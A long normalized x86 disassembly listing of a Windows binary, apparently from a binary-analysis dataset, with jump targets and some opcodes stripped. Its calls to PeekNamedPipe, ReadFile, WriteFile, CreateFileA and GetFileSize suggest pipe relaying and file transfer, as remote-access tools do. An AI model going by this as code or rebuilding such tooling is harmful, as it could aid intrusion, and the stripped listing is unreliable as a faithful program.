mov ecx [ ebp - 0x4c04 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c04 ]
mov [ eax ] dl
mov ecx [ ebp - 0x4968 ]
add ecx 0x2
mov [ ebp - 0x4b60 ] ecx
mov edx [ ebp - 0x4970 ]
sub edx 0x1
mov [ ebp - 0x4b5c ] edx
mov eax [ ebp - 0x4b5c ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x4970 ]
xor eax eax
mov al [ edx - 0x1 ]
cmp eax 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2528 ]
add eax 0x2
mov [ ebp - 0x4b38 ] eax
mov ecx [ ebp - 0x2530 ]
sub ecx 0x1
mov [ ebp - 0x4b34 ] ecx
mov edx [ ebp - 0x4b34 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2530 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x51c ] 0x0
mov [ ebp - 0x518 ] 0x0
mov [ ebp - 0x514 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x51c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x4c20 ] eax
mov ecx [ ebp - 0x4c20 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c20 ]
mov [ eax ] dl
mov ecx [ ebp - 0x4970 ]
sub ecx 0x1
mov [ ebp - 0x4c58 ] ecx
mov edx [ ebp - 0x4c58 ]
mov al [ edx ]
sub al 0x1
mov ecx [ ebp - 0x4c58 ]
mov [ ecx ] al
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2530 ]
sub eax 0x1
mov [ ebp - 0x4c44 ] eax
mov ecx [ ebp - 0x4c44 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c44 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov eax [ ebp - 0x514 ]
add eax 0x2
mov [ ebp - 0x4af4 ] eax
mov ecx [ ebp - 0x51c ]
sub ecx 0x1
mov [ ebp - 0x4af0 ] ecx
mov edx [ ebp - 0x4af0 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x51c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x51c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x4b40 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x4b3c ] ecx
mov edx [ ebp - 0x4b3c ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x51c ]
sub eax 0x1
mov [ ebp - 0x4c24 ] eax
mov ecx [ ebp - 0x4c24 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c24 ]
mov [ eax ] dl
mov [ ebp - 0x51c ] 0x0
mov [ ebp - 0x518 ] 0x0
mov [ ebp - 0x514 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x51c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x4c48 ] eax
mov ecx [ ebp - 0x4c48 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c48 ]
mov [ eax ] dl
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x4afc ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x4af8 ] ecx
mov edx [ ebp - 0x4af8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x48c ] 0x0
jne r-xdata
mov eax [ ebp - 0x514 ]
add eax 0x2
mov [ ebp - 0x4b48 ] eax
mov ecx [ ebp - 0x51c ]
sub ecx 0x1
mov [ ebp - 0x4b44 ] ecx
mov edx [ ebp - 0x4b44 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x51c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4c28 ] eax
mov ecx [ ebp - 0x4c28 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c28 ]
mov [ eax ] dl
mov [ ebp - 0x48c ] 0x0
mov [ ebp - 0x488 ] 0x0
mov [ ebp - 0x484 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x48c ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x51c ]
sub eax 0x1
mov [ ebp - 0x4c4c ] eax
mov ecx [ ebp - 0x4c4c ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c4c ]
mov [ eax ] dl
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x4b04 ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x4b00 ] ecx
mov edx [ ebp - 0x4b00 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2d0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x484 ]
add eax 0x2
mov [ ebp - 0x4b50 ] eax
mov ecx [ ebp - 0x48c ]
sub ecx 0x1
mov [ ebp - 0x4b4c ] ecx
mov edx [ ebp - 0x4b4c ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x48c ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4c2c ] eax
mov ecx [ ebp - 0x4c2c ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c2c ]
mov [ eax ] dl
mov [ ebp - 0x2d0 ] 0x0
mov [ ebp - 0x2cc ] 0x0
mov [ ebp - 0x2c8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
xor eax eax
mov al [ edx - 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x48c ]
sub eax 0x1
mov [ ebp - 0x4c50 ] eax
mov ecx [ ebp - 0x4c50 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c50 ]
mov [ eax ] dl
mov eax [ ebp - 0x2c8 ]
add eax 0x2
mov [ ebp - 0x4b58 ] eax
mov ecx [ ebp - 0x2d0 ]
sub ecx 0x1
mov [ ebp - 0x4b54 ] ecx
mov edx [ ebp - 0x4b54 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x2d0 ]
xor edx edx
mov dl [ ecx - 0x1 ]
cmp edx 0xff
jne r-xdata
mov eax [ ebp - 0x2d0 ]
sub eax 0x1
mov [ ebp - 0x4c54 ] eax
mov ecx [ ebp - 0x4c54 ]
mov dl [ ecx ]
sub dl 0x1
mov eax [ ebp - 0x4c54 ]
mov [ eax ] dl
sub_404f50
sub esp 0x94
lea eax [ esp ]
mov [ esp ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
or eax 0xffffffff
add esp 0x94
retn
xor ecx ecx
cmp eax 0x2
sete cl
mov eax ecx
add esp 0x94
retn
or eax 0xffffffff
add esp 0x94
retn
sub_404fa0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_408fd6
push eax
mov eax 0x6034
mov [ fs : 0x0 ] esp
call sub_4089e0
mov al [ esp + 0xb ]
push ebx
push ebp
xor ebp ebp
push esi
push edi
mov [ esp + 0x24 ] al
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] ebp
mov [ esp + 0x30 ] ebp
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x44 ]
push ebp
[ edi ]
mov ecx 0x800
lea edi [ esp + 0x2048 ]
[ edi ]
mov eax [ rw-data ]
lea ecx [ esp + 0x14 ]
push ebp
push ecx
lea edx [ esp + 0x50 ]
push 0x1fec
push edx
push eax
mov [ esp + 0x6064 ] ebp
mov [ esp + 0x34 ] ebp
mov [ esp + 0x2c ] ebp
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
push ebp
call [ ExitThread@IAT ]
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x44 ]
[ edi ]
cmp [ esp + 0x10 ] ebp
jbe r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x1770
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x10 ]
push ebp
push ecx
lea edx [ esp + 0x4c ]
push 0x1fec
push edx
push eax
mov [ rw-data ] 0x1
call [ ReadFile@IAT ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
inc eax
cmp eax 0x1
mov [ esp + 0x1c ] eax
jne r-xdata
push 0x32
call [ Sleep@IAT ]
mov [ rw-data ] 0x0
mov [ esp + 0x14 ] ebp
mov ecx 0x3
mov edi rw-data
lea esi [ esp + 0x44 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx edx
lea esi [ esp + 0x44 ]
mov eax ecx
lea edi [ esp + 0x2044 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x2044 ]
lea esi [ esp + 0x44 ]
[ edi ]
mov ecx edx
lea edi [ esp + 0x2044 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x3
mov edi rw-data
lea esi [ esp + 0x44 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
lea esi [ esp + 0x44 ]
[ edi ]
mov ecx edx
mov edi rw-data
mov eax ecx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov [ rw-data ] edx
[ edi ] [ esi ]
mov ecx 0x800
lea edi [ esp + 0x4048 ]
[ edi ]
mov ecx edx
mov esi rw-data
mov eax ecx
lea edi [ esp + 0x4048 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x4048 ]
push ecx
mov ecx rw-data
call sub_407bc0
lea edx [ esp + 0x34 ]
mov ecx rw-data
push edx
call sub_4082e0
mov ecx [ r--data ]
mov [ esp + 0x604c ] 0x1
push ecx
push ebp
push eax
lea ecx [ esp + 0x30 ]
call sub_406120
mov eax [ esp + 0x38 ]
mov [ esp + 0x604c ] 0x0
cmp eax ebp
je r-xdata
lea edi [ esp + 0x44 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
dec esi
cmp esi ebp
jle r-xdata
mov ecx 0x3
mov edi rw-data
lea esi [ esp + 0x44 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
lea edi [ esp + 0x2044 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x38 ] ebp
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x2044 ]
mov edx ecx
sub eax 0x3
add edx eax
lea edi [ esp + 0x4044 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi edx
mov esi ecx
lea ecx [ esp + 0x4044 ]
sub ecx 0x3
mov [ esp + 0x3c ] ebp
add esi ecx
mov ecx 0x3
xor eax eax
mov [ esp + 0x40 ] ebp
[ esi ] [ edi ]
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
movsx ecx [ esp + 0x44 ]
push ecx
call islower
mov bl [ esp + 0x48 ]
add esp 0x4
test eax eax
je r-xdata
cmp [ esp + esi + 0x44 ] 0xa
je r-xdata
mov ecx 0x3
mov edi rw-data
lea esi [ esp + 0x44 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov edx [ esp + 0x2c ]
cmp edx ebp
je r-xdata
sbb eax eax
sbb eax 0xffffffff
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
movsx edx [ esp + esi + 0x45 ]
lea esi [ esp + esi + 0x45 ]
push edx
call islower
add esp 0x4
test eax eax
mov al [ esi ]
je r-xdata
sub bl 0x20
dec esi
cmp esi ebp
jg r-xdata
lea eax [ esp + 0x45 ]
mov ecx rw-data
mov ax [ eax ]
cmp ax [ ecx ]
jne r-xdata
mov [ rw-data ] 0x0
cmp eax ebp
jne r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
cmp bl al
jne r-xdata
sub al 0x20
mov eax [ rw-data ]
push ebp
lea ecx [ esp + 0x14 ]
push ebp
push ecx
lea edx [ esp + 0x50 ]
push 0x1fec
push edx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
mov [ esp + 0x20 ] esi
je r-xdata
mov edx [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x2044 ]
[ edi ]
mov ecx edx
lea esi [ esp + 0x44 ]
mov eax ecx
lea edi [ esp + 0x2044 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
cmp edx ebp
jbe r-xdata
mov eax [ r--data ]
mov ebp edx
cmp esi ebp
ja r-xdata
xor ebp ebp
movsx eax [ rw-data ]
mov ebx [ esp + 0x28 ]
mov edx 0x1
sub edx esi
add ebp edx
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
mov ecx esi
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x28 ]
sub eax ecx
xor ebp ebp
jmp r-xdata
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
movsx eax [ rw-data ]
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
jne r-xdata
cmp eax ebp
jne r-xdata
mov esi [ esp + 0x20 ]
sub_405400
mov edx [ esp + 0x4 ]
push edi
lea eax [ esp + 0x8 ]
push 0x0
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ rw-data ]
push edx
push ecx
call [ WriteFile@IAT ]
test eax eax
setne al
pop edi
retn
sub_405430
push 0xffffffff
push sub_409000
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov al [ esp + 0x54 ]
push ebx
push ebp
push esi
push edi
push 0x0
lea ecx [ esp + 0x34 ]
mov [ esp + 0x34 ] al
call sub_4063b0
push 0x64
mov [ esp + 0x60 ] 0x0
xor bl bl
call malloc
mov edx [ esp + 0x68 ]
mov ebp eax
mov ecx 0x19
xor eax eax
mov edi ebp
add esp 0x4
[ edi ]
mov ecx 0x3
mov edi rw-data
mov esi edx
xor eax eax
[ esi ] [ edi ]
mov [ esp + 0x14 ] ebp
jne r-xdata
or esi 0xffffffff
mov edi edx
mov ecx esi
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff6
add edx 0x9
push ecx
or esi 0xffffffff
mov edi edx
mov ecx esi
mov bl 0x1
[ edi ]
not ecx
add ecx 0xfffffff8
add edx 0x7
push ecx
jmp r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
cmp bl 0x1
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
jne r-xdata
push 0x5
push rw-data
mov ecx rw-data
call sub_407bc0
push edx
push ebp
call strncpy
add esp 0xc
mov ecx rw-data
push 0xa
push rw-data
call sub_407bc0
test al al
jne r-xdata
test bl bl
jne r-xdata
push eax
push 0x80
push 0x2
push eax
push eax
push 0x40000000
push ebp
call [ CreateFileA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call free
mov ecx [ esp + 0x38 ]
add esp 0x4
test ecx ecx
je r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push ecx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x64 ] eax
je r-xdata
push 0x1a
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
je r-xdata
push edi
mov ecx rw-data
call sub_408440
test al al
je r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
push 0xffffffff
call [ CloseHandle@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
jne r-xdata
lea edx [ esp + 0x24 ]
push edx
push eax
call [ GetFileSize@IAT ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx rw-data
mov [ esp + 0x20 ] eax
call sub_4082e0
mov edx [ r--data ]
lea ecx [ esp + 0x30 ]
push edx
push 0x0
push eax
mov [ esp + 0x68 ] 0x1
call sub_406120
push 0x1
lea ecx [ esp + 0x44 ]
mov [ esp + 0x60 ] bl
call sub_4063b0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push eax
push rw-data
lea ecx [ esp + 0x3c ]
call sub_406320
test eax eax
jne r-xdata
lea eax [ esp + 0x20 ]
mov ecx rw-data
push eax
call sub_4082e0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_4063b0
jmp r-xdata
push 0x11
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
jne r-xdata
push 0x10
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
jne r-xdata
dec ecx
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
lea eax [ esp + 0x40 ]
mov ecx rw-data
push eax
call sub_4082e0
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push 0x5
push rw-data
mov ecx rw-data
call sub_407bc0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x10 ] ecx
je r-xdata
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
push 0x1
lea ecx [ esp + 0x34 ]
mov [ esp + 0x60 ] esi
call sub_4063b0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn
lea edx [ esp + 0x20 ]
mov ecx rw-data
push edx
call sub_4082e0
push 0x1
lea ecx [ esp + 0x24 ]
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
lea ecx [ esp + 0x20 ]
push ecx
mov ecx rw-data
call sub_4082e0
push 0x1
lea ecx [ esp + 0x24 ]
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
pop edi
dec al
pop esi
pop ebp
mov [ ecx - 0x1 ] al
pop ebx
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x64 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
mov ebp [ esp + 0x38 ]
test ebp ebp
jbe r-xdata
mov ecx [ esp + 0x38 ]
lea esi [ eax + 0x14 ]
add ecx 0xffffffe6
lea edi [ esp + 0x40 ]
mov edx ecx
lea eax [ esp + 0x40 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
call _atoi64
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax r--data
call sub_4063b0
push 0x64
call [ Sleep@IAT ]
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ r--data ]
mov eax ecx
cmp eax ebp
ja r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
pop edi
dec al
pop esi
pop ebp
mov [ ecx - 0x1 ] al
pop ebx
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
add esp 0x50
retn
mov eax [ esp + 0x18 ]
mov edi [ rw-data ]
mov ecx [ esp + 0x1c ]
mov esi [ rw-data ]
sub eax edi
sbb ecx esi
mov [ esp + 0x18 ] eax
or eax ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
movsx edx [ rw-data ]
mov ebx [ esp + 0x34 ]
mov ecx 0x1
mov esi eax
sub ecx esi
add ebp ecx
push ebp
push edx
push ebx
call memchr
add esp 0xc
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov esi [ esp + 0x64 ]
push 0x0
push edx
push eax
push esi
call sub_406080
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
add esp 0x10
push ecx
push edx
push esi
mov ecx rw-data
call sub_408530
test al al
je r-xdata
push 0x2
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax esi
push eax
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x40 ]
push ecx
mov ecx rw-data
call sub_4082e0
mov edx [ r--data ]
lea ecx [ esp + 0x30 ]
push edx
push 0x0
push eax
mov [ esp + 0x68 ] 0x3
call sub_406120
mov eax [ esp + 0x44 ]
mov [ esp + 0x5c ] 0x0
test eax eax
je r-xdata
push 0x5
push rw-data
mov ecx rw-data
call sub_407bc0
mov ecx [ esp + 0x64 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
lea edx [ esp + 0x40 ]
mov ecx rw-data
push edx
call sub_4082e0
mov ecx [ r--data ]
mov [ esp + 0x5c ] 0x2
push ecx
push 0x0
push eax
lea ecx [ esp + 0x3c ]
call sub_406120
mov eax [ esp + 0x44 ]
mov [ esp + 0x5c ] 0x0
test eax eax
je r-xdata
sub eax [ esp + 0x34 ]
jmp r-xdata
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
movsx eax [ rw-data ]
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x64 ] ecx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x10 ] ecx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0xc8
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ Sleep@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
je r-xdata
mov ebp [ esp + 0x38 ]
test ebp ebp
jbe r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0xc8
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ Sleep@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
mov ecx rw-data
call sub_407bc0
test al al
jne r-xdata
mov ebp [ esp + 0x38 ]
test ebp ebp
jbe r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
lea eax [ esp + 0x40 ]
mov ecx rw-data
push eax
call sub_4082e0
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
mov eax [ r--data ]
mov eax ecx
cmp eax ebp
ja r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
lea eax [ esp + 0x40 ]
mov ecx rw-data
push eax
call sub_4082e0
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
mov eax [ r--data ]
mov eax ecx
cmp eax ebp
ja r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov ebx [ esp + 0x34 ]
mov eax 0x1
mov edx ecx
movsx ecx [ rw-data ]
sub eax edx
add ebp eax
push ebp
push ecx
push ebx
call memchr
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x64 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
movsx eax [ rw-data ]
mov ebx [ esp + 0x34 ]
mov edx 0x1
mov esi ecx
sub edx esi
add ebp edx
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
je r-xdata
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x64 ]
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
push ecx
call ??3@YAXPAX@Z
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x10 ]
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub eax [ esp + 0x34 ]
jmp r-xdata
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
movsx eax [ rw-data ]
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
jne r-xdata
dec al
mov [ ecx ] al
mov ecx [ esp + 0x64 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
sub eax [ esp + 0x34 ]
jmp r-xdata
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
movsx eax [ rw-data ]
push ebp
push eax
push ebx
call memchr
add esp 0xc
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
sub_405c90
sub esp 0x30
push ebx
push ebp
push esi
push edi
xor eax eax
push 0x64
mov [ esp + 0x20 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x30 ] eax
call malloc
mov ebx eax
push 0x64
mov [ esp + 0x30 ] ebx
call malloc
mov esi eax
push 0x64
mov [ esp + 0x2c ] esi
call malloc
mov ebp eax
mov ecx 0x19
xor eax eax
mov edi ebx
[ edi ]
mov ecx 0x19
mov edi esi
